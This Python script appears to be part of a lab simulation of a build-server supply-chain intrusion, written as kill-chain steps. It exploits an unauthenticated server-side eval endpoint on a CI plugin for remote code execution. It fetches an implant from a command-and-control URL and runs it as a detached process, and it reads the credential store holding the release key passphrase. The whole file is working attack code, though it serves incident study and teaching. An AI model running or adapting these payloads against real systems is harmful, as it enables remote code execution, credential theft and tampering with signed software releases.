#!/usr/bin/env python3
"""
attacker.py -- the intrusion, expressed as the kill-chain steps.

Each function here is one step the attacker performed. run_simulation.py calls
them in order; you can also read this file top to bottom as the attack story.

Everything talks to the lab services over real HTTP. The only "magic" is the
eval() the vulnerable plugin gives away for free (F1).
"""

import json
import os
import sys
import urllib.parse
import urllib.request

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import common

BUILD_URL = "http://127.0.0.1:18080"
C2_URL = "http://cdn-sync-eu.net:19090"        # stub-resolves to 127.0.0.1
TARGET_VERSIONS = "4.11.2,4.12.1,4.13.0"
# how long each payload build freezes the victim's release job (models F6).
# the freeze absorbs about a second the job would have spent unlocking the
# keystore anyway, so the job gains roughly (hold - 1) minutes*6 of extra time:
# +18, +15.6 and +20.1 simulated minutes on top of a ~34 minute baseline.
HOLDS = ["4.0", "3.6", "4.35"]


def _eval(expr):
    """Hit the vulnerable plugin helper. Unauthenticated, server-side eval."""
    url = f"{BUILD_URL}/plugin/build-tools/eval?expr={urllib.parse.quote(expr)}"
    with urllib.request.urlopen(url, timeout=15) as r:
        return r.read().decode().strip()


def step_recon():
    """Kill chain: reconnaissance.

    The dashboard is world-readable (F2). The 'build-tools' plugin helper is
    linked right on the front page.
    """
    with urllib.request.urlopen(BUILD_URL + "/", timeout=10) as r:
        page = r.read().decode()
    common.step("attacker", "found automation dashboard, world reachable (F2)")
    cwd = _eval("__import__('os').getcwd()").split("result: ")[-1]
    common.step("attacker", f"plugin helper evaluates expressions unauthenticated (F1); server cwd = {cwd}")
    return cwd.strip("'\"")


def step_stage_c2():
    """Kill chain: weaponisation / infrastructure.

    Register the callback domain 12 days before the first tampered build (F31),
    and put the tamper implant on the C2 box for retrieval.
    """
    whois = (
        f"Domain Name: {common.ATTACKER_DOMAIN.upper()}\n"
        "Registry Expiry Date: 2028-02-18\n"
        "Creation Date: 2027-02-18T09:14:00Z\n"
        "Registrar: BudgetNames LLC (REDACTED)\n"
        "Name server only -- registered 12 days before the first tampered build (F31)\n"
    )
    with open(os.path.join(common.ATTACKER_DIR, "whois.txt"), "w") as f:
        f.write(whois)
    common.step("attacker", f"registered {common.ATTACKER_DOMAIN} on 18 Feb 2027 (F31)")
    common.step("attacker", f"tamper implant staged at {C2_URL}/payloads/tamper_daemon.py")


def step_exploit(build_dir):
    """Kill chain: exploitation + installation.

    Two requests to the unauthenticated plugin helper (F1):
      1. fetch the tamper implant from C2 onto BUILD-01
      2. launch it as a detached process -- an out-of-band process on the host,
         invisible to the CI job's console log (F7), unwatched because BUILD-01
         has no EDR (F4) and only 14 days of local logs (F3).
    """
    src = f"{C2_URL}/payloads/tamper_daemon.py"
    q1 = (f"open('/tmp/tamper_daemon.py','w').write("
          f"__import__('urllib.request',fromlist=['urlopen']).urlopen('{src}').read().decode())")
    r1 = _eval(q1)
    common.step("attacker", f"RCE via /plugin/build-tools/eval -- implant downloaded ({r1.splitlines()[0]})")

    cmd = (f"__import__('subprocess').Popen([__import__('sys').executable,'/tmp/tamper_daemon.py',"
           f"'{build_dir}','{TARGET_VERSIONS}',{','.join(repr(h) for h in HOLDS)}],start_new_session=True)")
    _eval(cmd)
    common.step("attacker", "implant launched as detached process on BUILD-01")


def step_loot_keystore(build_dir):
    """Kill chain: credential access (optional for the attacker, shown here).

    The release key passphrase sits in the CI tool's credential store on the
    same box (F10). The attacker reads it to prove a point: with the passphrase
    and the keystore file, the release key could be used from anywhere. In this
    incident the attacker never needed to -- the pipeline signed for them.
    """
    path = os.path.join(build_dir, "credential_store.json")
    creds = _eval(f"open({path!r}).read()").split("result: ")[-1]
    common.step("attacker", f"credential store readable via RCE (F10): {creds[:60]}...")
    common.step("attacker", "keystore file + passphrase = portable release key; not even needed here")


def wait_for_swaps(timeout=60):
    """The implant does its work during release jobs; nothing for us to do."""
    common.step("attacker", "waiting for release jobs -- the implant swaps staging at build time")


def main():
    build_dir = os.path.join(common.PROTO, "build_server")
    step_recon()
    step_stage_c2()
    step_exploit(build_dir)
    step_loot_keystore(build_dir)


if __name__ == "__main__":
    main()
